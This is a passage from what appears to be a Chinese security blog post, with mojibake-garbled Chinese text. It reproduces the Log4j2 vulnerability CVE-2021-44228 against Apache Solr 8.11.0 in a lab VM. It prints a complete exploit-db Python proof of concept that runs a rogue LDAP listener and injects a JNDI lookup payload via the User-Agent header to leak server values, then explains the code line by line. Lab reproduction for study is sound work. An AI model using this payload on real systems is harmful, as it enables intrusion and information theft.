solrç‰ˆæœ¬</span><span class="punctuation">:</span> <span class="string">8.11.0</span></span><br></pre></td></tr></table></figure><h3 id="Apache-solr-8-11-0ä¸‹è½½"><a href="#Apache-solr-8-11-0ä¸‹è½½" class="headerlink" title="Apache solr 8.11.0ä¸‹è½½"></a>Apache solr 8.11.0ä¸‹è½½</h3><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯<code>Apache Solr</code>å¼€æºæœåŠ¡å™¨</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solræ˜¯Apacheä¸‹çš„ä¸€ä¸ªé¡¶çº§å¼€æºé¡¹ç›®ï¼Œé‡‡ç”¨Javaå¼€å‘ï¼Œå®ƒæ˜¯åŸºäºLuceneçš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚Solræä¾›äº†æ¯”Luceneæ›´ä¸ºä¸°å¯Œçš„æŸ¥è¯¢è¯­è¨€ï¼ŒåŒæ—¶å®ç°äº†å¯é…ç½®ã€å¯æ‰©å±•ï¼Œå¹¶å¯¹ç´¢å¼•ã€æœç´¢æ€§èƒ½è¿›è¡Œäº†ä¼˜åŒ–ã€‚</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹æ¼æ´ä¿®å¤æ—¶é—´<code>[12 æœˆ 5 æ—¥]</code>ï¼Œå’Œå®˜æ–¹æ›´æ–°æ–‡æ¡£</p><p><img src="/2022/12/01/CVE-Test/image-20221201005804892.png" alt="image-20221201005804892"></p><p><code>Apache Solr 8.11.0</code>æ˜¯<code>CVE-2021-44228</code>ä¿®å¤å‰çš„æœ€åçš„ä¸€ä¸ªç‰ˆæœ¬</p><p>æ‰€ä»¥è¯¥ç‰ˆæœ¬ä¹Ÿå­˜åœ¨<code>CVE-2021-44228</code></p><p>äºæ˜¯ä¸‹è½½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>lucene<span class="regexp">/solr/</span><span class="number">8.11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201010242171.png" alt="image-20221201010242171"></p><h3 id="JAVAé…ç½®"><a href="#JAVAé…ç½®" class="headerlink" title="JAVAé…ç½®"></a>JAVAé…ç½®</h3><p>ç”±äº<code>Apache solr</code>æ˜¯åŸºäº<code>Java</code>å¼€å‘çš„é¡¹ç›®ï¼Œæ‰€ä»¥éœ€è¦å…ˆä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>Java</code></p><p><strong>ä½†æ˜¯é’ˆå¯¹log4j2å­˜åœ¨çš„ç‰ˆæœ¬ï¼Œéœ€è¦jdk1.8.0æ‰å¯ä»¥å¤ç°</strong></p><p>ä½†æ˜¯</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é«˜ç‰ˆæœ¬çš„JDKç¯å¢ƒä¸­trustURLCodebaseå˜é‡ä¸ºfalseï¼Œé™åˆ¶äº†è¿œç¨‹ç±»çš„åŠ è½½ï¼Œå¯¼è‡´JNDIæ³¨å…¥åˆ©ç”¨å¤±è´¥ï¼Œæ— æ³•åå¼¹shell</span><br><span class="line">èƒ½å®ç°åˆ©ç”¨æ¡ä»¶ï¼šç‰ˆæœ¬â‰¤ JDK <span class="number">6u211ã€7u201</span>ã€ <span class="number">8u191ã€11.0</span>.<span class="number">1</span>ã€‚</span><br><span class="line">ä½†æ˜¯è¿‡ä½ç‰ˆæœ¬çš„ï¼Œsolrè¿è¡Œå¯èƒ½ä¼šå‡ºé”™</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œä»å®˜ç½‘ä¸‹è½½ä¸“é—¨çš„<code>8u171</code></p><h4 id="è§£å‹åˆ°å¯¹åº”ç›®å½•"><a href="#è§£å‹åˆ°å¯¹åº”ç›®å½•" class="headerlink" title="è§£å‹åˆ°å¯¹åº”ç›®å½•"></a>è§£å‹åˆ°å¯¹åº”ç›®å½•</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221221161421513.png" alt="image-20221221161421513"></p><h4 id="éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡"><a href="#éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡" class="headerlink" title="éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡"></a>éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä¸‹é¢6è¡Œå†…å®¹</span><br><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 <span class="comment">## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç‰ˆæœ¬"><a href="#æŸ¥çœ‹ç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹ç‰ˆæœ¬"></a>æŸ¥çœ‹ç‰ˆæœ¬</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221221161638879.png" alt="image-20221221161638879"></p><h3 id="Solrä¸‹è½½"><a href="#Solrä¸‹è½½" class="headerlink" title="Solrä¸‹è½½"></a><code>Solr</code>ä¸‹è½½</h3><p>ä¸‹è½½<code>solr 8.11.0</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201111930502.png" alt="image-20221201111930502"></p><p><img src="/2022/12/01/CVE-Test/image-20221201112302036.png" alt="image-20221201112302036"></p><p>ç„¶åå°±è§£å‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></p><h3 id="å®‰è£…-Apache-SolræœåŠ¡"><a href="#å®‰è£…-Apache-SolræœåŠ¡" class="headerlink" title="å®‰è£… Apache SolræœåŠ¡"></a>å®‰è£… <code>Apache Solr</code>æœåŠ¡</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201112725299.png" alt="image-20221201112725299"></p><p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201112839632.png" alt="image-20221201112839632"></p><p>å‘ç°æœåŠ¡å·²ç»å­˜åœ¨</p><p>å¯åŠ¨</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="regexp">/lib/</span>systemd/systemd-sysv-install enable solr</span><br><span class="line"><span class="comment">#è‹¥æ‰§è¡Œsudo systemctl enable solrä¼šæç¤ºä¸æ˜¯æœ¬æœºæœåŠ¡ï¼Œéœ€è¦æŒ‰ä¸Šé¢æ–¹å¼å¯åŠ¨è¿è¡Œ</span></span><br></pre></td></tr></table></figure><p>å› ä¸º<code>solr</code>é»˜è®¤è¿è¡Œçš„ç«¯å£ä¸º<code>8983</code></p><p>æŸ¥çœ‹ç¯å¢ƒæ­å»ºçš„è™šæ‹Ÿæœº<code>ip</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221201113319037.png" alt="image-20221201113319037"></p><p>å¾—åˆ°ç¯å¢ƒæ­å»ºé¶æœº<code>ip</code>ä¸º</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure><h3 id="æˆåŠŸ"><a href="#æˆåŠŸ" class="headerlink" title="æˆåŠŸ"></a>æˆåŠŸ</h3><p>æµè§ˆå™¨è®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/01/CVE-Test/image-20221220220624019.png" alt="image-20221220220624019"></p><p>æ­å»ºæˆåŠŸ</p><p>å†…ç½‘ç¯å¢ƒä¸­çš„æ”»å‡»æœºä¹ŸæˆåŠŸè®¿é—®</p><p><img src="/2022/12/01/CVE-Test/image-20221201115827107.png" alt="image-20221201115827107"></p><p>ç¯å¢ƒæ­å»ºå®Œæ¯•</p><h2 id="è„šæœ¬åˆ†æ"><a href="#è„šæœ¬åˆ†æ" class="headerlink" title="è„šæœ¬åˆ†æ"></a>è„šæœ¬åˆ†æ</h2><p>è¿™é‡Œè°ƒç”¨**<code>exploitdb</code>**ä¸­çš„å¯¹<code>Log4j2</code>åˆ©ç”¨çš„è„šæœ¬ï¼Œè¿™æ˜¯ä¸€ä¸ªä¿¡æ¯æ³„éœ²çš„è„šæœ¬</p><p>å‘å¸ƒæ—¶é—´: <code>12/12/2021</code></p><p><code>ã€ps.è¿™ä¸ªè„šæœ¬å¯èƒ½æ˜¯ä½œè€…ä¸Šä¼ åˆ°expçš„æ—¶å€™ç©ºæ ¼é—®é¢˜ï¼Œéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥ç”¨äº†ã€‘</code></p><p><img src="/2022/12/01/CVE-Test/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></p><p>è„šæœ¬å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure><h3 id="ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ"><a href="#ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ" class="headerlink" title="ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ"></a>ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>å®šä¹‰ <code>LDAP_HEADER</code> å¸¸é‡ï¼Œè¿™æ˜¯å“åº” <code>LDAP</code> è¯·æ±‚æ—¶ä½¿ç”¨çš„å¤´ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>è¿™é‡Œå®šä¹‰<code>ThreadedTCPRequestHandler</code> ç±»çš„ <code>handle()</code> æ–¹æ³•ç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ã€‚</p><p>è¯¥æ–¹æ³•é¦–å…ˆè¾“å‡ºæ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ä¿¡æ¯ï¼Œç„¶åé€šè¿‡è°ƒç”¨ <code>sock.recv()</code> å’Œ <code>sock.sendall()</code> æ–¹æ³•è¯»å–å®¢æˆ·ç«¯å‘é€</p><p>çš„æ•°æ®ï¼Œå¹¶å‘é€å“åº”æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> ç±»æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ <code>TCP</code> æœåŠ¡å™¨ï¼Œå®ƒç»§æ‰¿è‡ª <code>socketserver.ThreadingMixIn</code> å’Œ </p><p><code>socketserver.TCPServer</code> ç±»ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()å‡½æ•°ä½¿ç”¨æ¨¡å—è®¾ç½®å‘½ä»¤è¡Œå‚æ•°è§£æå™¨argparseï¼Œç„¶åè§£æå‘½ä»¤è¡Œå‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ç±»ä¼¼<code>-t,-lh,-lp</code>ç­‰ç­‰å°±æ˜¯è§£æå™¨è®¾ç½®ä¸ºæ¥å—å‘½ä»¤è¡Œå‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>parse_args()</code> 